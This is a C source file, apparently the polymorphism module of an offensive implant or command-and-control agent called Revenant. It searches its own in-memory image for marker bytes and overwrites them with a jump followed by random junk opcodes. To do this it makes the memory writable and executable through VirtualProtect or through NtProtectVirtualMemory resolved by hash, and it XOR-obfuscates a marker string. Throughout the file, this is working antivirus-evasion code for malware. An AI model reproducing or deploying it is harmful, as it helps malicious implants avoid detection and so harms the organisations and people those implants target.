//
// Created by 0xtriboulet on 4/15/2023.
//
#include "Asm.h"
#include "Config.h"
#include "Poly.h"
#include "Revenant.h"
#include "Strings.h"
#include "Obfuscation.h"
#include "Defs.h"

#include <tchar.h>

#if CONFIG_POLYMORPHIC == TRUE

INT morphModule() {
    INT returnValue = 1;

#if CONFIG_OBFUSCATION == TRUE

    unsigned char s_xk[] = S_XK;
    unsigned char s_string[] = S_MARKER_MASK;

    char * MARKER_MASK = xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk));

#else
    //char * MARKER_MASK = S_MARKER_MASK;
    // Reserved for future functionality
    char * MARKER_MASK = "xxxxxxxxxxxxxxxxxxxxxxxx";
#endif

    // Declare the MODULEINFO struct to store module information.
    MODULEINFO modInfo;

    // Obtain the current process handle.
    HANDLE hProcess = NtCurrentProcess;

    // Get a handle to the base module of the current process.
    HMODULE hModule = GetModuleHandleA(NULL);

    // If the module information is obtained successfully, enter the loop.
    if (GetModuleInformation(hProcess, hModule, &modInfo, sizeof(MODULEINFO)))
    {
        // Check if module size is less than MAXDWORD.
        if (modInfo.SizeOfImage < MAXDWORD)
        {
            // Declare the byte pointer to the last matching pattern and the match offset.
            PBYTE pbyLastMatch = 0;
            DWORD dwMatchOffset = 0;

            // Set the morphing status to not finished.
            BOOL bMorphingFinished = FALSE;

            // Declare a counter for the number of memory regions that have been morphed.
            DWORD dwRegionCount = 0;

            BYTE markerAddr[MARKER_SIZE] = {0};
            mem_cpy(markerAddr,MARKER_BYTES,MARKER_SIZE);

            // Iterate through memory regions of the current process's module to search for the marker pattern.
            while (!bMorphingFinished)
            {

                // Call the findPattern function to search for the marker pattern in memory.
                PBYTE startAddr= (PBYTE)modInfo.lpBaseOfDll;
                pbyLastMatch = findPattern(startAddr, modInfo.SizeOfImage, markerAddr, MARKER_MASK, MARKER_SIZE);

                // If the marker pattern is found, replace it with random opcodes and update the offsets.
                if (pbyLastMatch != NULL)
                {
                    morphMemory(pbyLastMatch, (BYTE) MARKER_SIZE);
                }
                    // If the marker pattern is not found, set the morphing status to finished.
                else
                {
                    returnValue = 0;
                    bMorphingFinished = TRUE;
                }
            }
        }
    }

    // Clean up the process handle.
    CloseHandle(hProcess);
    return returnValue;
}


int morphMemory(PBYTE pbyDst, BYTE byLength)
{
    /*                  *
    *** JUNK CODE ALGO ***
    jmp        or      0x90
    rdm                jmp
    rdm                rdm
    rdm                rdm
    */

    // Initialize a flag to seed the random number generator
    static BOOL bSetSeed = TRUE;
    if (bSetSeed)
    {
        srand((UINT)time(NULL));
        bSetSeed = FALSE;
    }

    // Allocate memory for the opcodes to be morphed
    PBYTE morphedOpcodes = (PBYTE)malloc(byLength * sizeof(BYTE));
    BYTE byOpcodeIt = 0;

    // Determine whether to insert a NOP instruction at the beginning of the opcodes
    BOOL bPlaceNop = (rand() % 2) ? TRUE : FALSE;
    if (bPlaceNop)
    {
        morphedOpcodes[byOpcodeIt] = ASM_OPCODE_NOP;
        byOpcodeIt++;
    }

    // Insert a relative JMP instruction at the beginning of the opcodes
    morphedOpcodes[byOpcodeIt] = ASM_OPCODE_JMP_REL;
    byOpcodeIt++;

    // Calculate the length of the JMP instruction and insert it after the JMP instruction
    morphedOpcodes[byOpcodeIt] = byLength - ASM_INSTR_SIZE_JMP_REL - ((bPlaceNop) ? ASM_INSTR_SIZE_NOP : 0);
    byOpcodeIt++;

    // Insert random opcodes after the JMP instruction
    for (; byOpcodeIt < byLength; byOpcodeIt++)
        morphedOpcodes[byOpcodeIt] = rand() % MAXBYTE; // 0xFF

    // Change the protection of the memory to allow execution and write the morphed opcodes to memory
    DWORD dwOldProtect = 0x0;

#if CONFIG_NATIVE == TRUE

#if CONFIG_ARCH == 64
    void *p_ntdll = get_ntdll_64();
#else
    void *p_ntdll = get_ntdll_32();
#endif //CONFIG_ARCH
    PBYTE pbyMarker = pbyDst;

    NTSTATUS status;
    NtProtectVirtualMemory_t p_NtProtectVirtualMemory = GetProcAddressByHash(p_ntdll, NtProtectVirtualMemory_CRC32B);
    size_t pbySize = sizeof(MARKER_BYTES);

    // set permissions
    if((status = p_NtProtectVirtualMemory(NtCurrentProcess,&pbyDst, &pbySize,PAGE_EXECUTE_READWRITE,&dwOldProtect)) != 0){
        // _tprintf("FAILED!\n");
        return -1;
    }

    // patch marker bytes
    mem_cpy((void *) pbyMarker,  (const void *) morphedOpcodes, (size_t) byLength);

    // Restore the original memory protection
    if((status = p_NtProtectVirtualMemory(NtCurrentProcess, &pbyDst, &pbySize, dwOldProtect, &dwOldProtect)) != 0){
        //_tprintf("FAILED\n");
        return -1;
    }
    //__asm("int3");
#else


    VirtualProtect(pbyDst, byLength, PAGE_EXECUTE_READWRITE, &dwOldProtect);

    mem_cpy((void *) pbyDst,  (void *) morphedOpcodes, (size_t) byLength);

    // Restore the original memory protection
    VirtualProtect(pbyDst, byLength, dwOldProtect, &dwOldProtect);

#endif //CONFIG NATIVE

    // Free the memory allocated for the morphed opcodes
    free(morphedOpcodes);
    return 0;
}

// pszMask reserved for future use
PBYTE findPattern(PBYTE pData, SIZE_T uDataSize, PBYTE pPattern, PCHAR pszMask, SIZE_T uPatternSize)
{
    SIZE_T remainingLen = uDataSize;

    while(remainingLen > 0){
        if (mem_cmp(pData, pPattern, uPatternSize) == 0) {
            return pData;
        }else{
            // no match found, advance to the next byte
            pData++;
            remainingLen--;
        }
    }
    return NULL;
}

#else //CONFIG_POLYMORPHIC

void morphModule()
{
    return;
}
#endif //CONFIG_POLYMORPHIC
